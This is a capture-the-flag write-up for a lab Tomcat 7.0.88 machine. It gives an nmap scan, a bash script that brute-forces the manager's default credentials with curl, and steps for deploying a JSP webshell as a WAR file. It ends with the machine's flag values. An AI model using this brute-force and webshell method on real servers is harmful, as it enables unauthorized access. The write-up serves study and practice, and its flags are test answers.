#box #tomcat #webshell #file-upload
# Nmap

With a Nmap Scan we obtain the following open ports:

```bash
# Nmap 7.95 scan initiated Mon Mar 17 18:13:58 2025 as: /usr/lib/nmap/nmap -p- --min-rate=10000 -oA nmap_allports -v 10.129.72.100
Nmap scan report for 10.129.72.100
Host is up (0.077s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/share/nmap
# Nmap done at Mon Mar 17 18:14:25 2025 -- 1 IP address (1 host up) scanned in 26.83 seconds
```

# 8080

After visiting the website we discover that we're dealing with a Tomcat webserver, precisely of version `7.0.88`

We try to enumerate it and discover the existence of the endpoint `/manager`
Once on `/manager` we're asked to perform a basic authentication, then we try enumerate the default credentials available for tomcat, precisely with the seclist `/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt`

We then build the following bash script to iterate over the file while trying to authenticate with curl

```bash title:'Perform curl Basic Auth by extracting username and pass from tomcat-betterdefaultpasslist.txt'
#!/bin/bash
filename='/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt'
ip='10.129.60.220'
port='8080'
echo "Launching Tomcat Authenticator"
for row in `cat $filename`;
do
        usr=$(echo "$row" | awk '{split($0,a,":"); print a[1]}')
        psw=$(echo "$row" | awk '{split($0,a,":"); print a[2]}')
        echo "Trying with [$usr:$psw]"
        curl -u "$usr:$psw" -s -L "http://$ip:$port/manager" | if ! grep -q Unauthorized; then 
                echo "-- Authenticated with $usr:$psw !! --"
        fi
done < "$filename"
```

We discover that the following credentials: `tomcat:s3cret` are working and we login.

## Post Authentication

Inside the Tomcat manager we first try [CVE-2020-1938](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHETOMCAT-551994), precisely with the following [PoC](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi), but without success. Seems like the vulnerability isn't working properly on this machine since port 8009, requirement for this CVE doesn't feel open (scanned with `nmap -sV -p 8009,8080 10.129.60.220`).

We then try to perform another attack, this time leveraging on the WAR File Upload vulnerability. We're able to upload a webshell, in `jsp` and use it to sneak inside the target machine.
By using this very handy [webshell](https://github.com/tennc/webshell/blob/master/jsp/shell.jsp), we first `wget https://github.com/tennc/webshell/blob/master/jsp/shell.jsp` then we `zip -r backup.war shell.jsp` and we then upload `backup.war` from the manager panel of tomcat.

Once done, we'll be able to reach the endpoint http://10.129.60.220:8080/backup/shell.jsp and navigate freely in the system.
On the Administrator's desktop we'll be able to catch both the flags

User: `7004dbcef0f854e0fb401875f26ebd00`
Root: `04a8b36e1545a455393d067e772fe90e` 